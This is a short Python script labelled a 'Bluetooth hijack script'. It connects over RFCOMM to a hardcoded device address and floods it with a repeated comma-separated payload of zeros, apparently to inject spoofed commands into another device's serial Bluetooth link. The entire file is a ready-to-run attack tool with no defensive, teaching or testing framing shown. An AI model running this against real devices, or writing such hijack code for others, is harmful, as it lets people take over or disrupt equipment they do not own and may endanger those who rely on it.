import time
import argparse
from bluetooth import BluetoothSocket, RFCOMM


def attack(address: str, num_times: int, port: int):
    sock = BluetoothSocket(RFCOMM)
    try:
        print(f"[+] Connecting to {address} on port {port}...")
        sock.connect((address, port))
        print("[+] Connected.")

        for _ in range(num_times):
            payload = f"0,0,0,0,0,0,0,0\n"
            sock.send(payload)
            print(f"[>] Sent: {payload.strip()}")
            time.sleep(0.001)
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        sock.close()
        print("[+] Connection closed.")


def main():
    parser = argparse.ArgumentParser(description="Bluetooth hijack script.")
    parser.add_argument(
        "--address",
        nargs="?",
        default="00:21:13:01:FB:B5",
        help="Bluetooth address of the master device",
    )
    parser.add_argument(
        "--num_times",
        type=int,
        default=100,
        help="Number of times to send the payload",
    )
    parser.add_argument(
        "--port", type=int, default=1, help="RFCOMM port number (default: 1)"
    )
    args = parser.parse_args()

    attack(args.address, args.num_times, args.port)


if __name__ == "__main__":
    main()
